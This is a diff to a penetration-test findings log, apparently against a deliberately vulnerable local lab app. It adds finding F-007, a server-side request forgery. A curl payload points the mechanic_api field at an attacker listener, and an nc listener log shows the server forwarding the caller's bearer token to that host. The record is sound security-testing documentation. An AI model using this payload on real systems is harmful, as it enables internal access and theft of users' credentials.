@@ -272,3 +272,39 @@ An operator object (`$ne`) in place of a string returns a valid coupon → input
 is used in the Mongo query without type validation. Proves C:H (coupon disclosure
 / collection enumeration). Integrity (redeeming TRAC075 for credit) not captured
 here — attach a redemption request/response to evidence I:H.
+
+---
+
+## F-007 — SSRF via `mechanic_api` + bearer-token leak
+
+- **Timestamp:** 2026-10-21T09:56:00
+- **Identity used:** attacker (`ram`, RS256 token)
+- **Endpoint:** POST `/workshop/api/merchant/contact_mechanic`
+
+### Attack request
+```bash
+curl -s -i -X POST http://localhost:8888/workshop/api/merchant/contact_mechanic \
+  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
+  -d '{"mechanic_code":"TRAC_JHN","problem_details":"test","vin":"H3JPUM31REF7826CM",
+       "mechanic_api":"http://172.17.0.1:9000/ssrf-test",
+       "repeat_request_if_failed":false,"number_of_repeats":1}'
+```
+Screenshot: `evidence/F-007/2-attack-request.png`.
+
+### Server-side callback (attacker listener)
+```
+$ nc -lvnp 9000
+listening on [any] 9000 ...
+connect to [172.17.0.1] from (UNKNOWN) [172.19.0.10] 41480
+GET /ssrf-test?mechanic_code=TRAC_JHN&problem_details=test&vin=H3JPUM31REF7826CM&mechanic_api=http%3A%2F%2F172.17.0.1%3A9000%2Fssrf-test&... HTTP/1.1
+Host: 172.17.0.1:9000
+User-Agent: python-requests/2.30.0
+Authorization: Bearer eyJhbGciOiJSUzI1NiJ9...   <-- caller token forwarded
+```
+Screenshot: `evidence/F-007/1-listener-callback.png`.
+
+### Notes
+Source `172.19.0.10` is the app container, `python-requests/2.30.0` is the server
+HTTP client → the server fetched the attacker URL (non-blind SSRF). The outbound
+request carried the `Authorization` bearer token → credential leak to an
+attacker-controlled host. Internal-only service access not demonstrated.
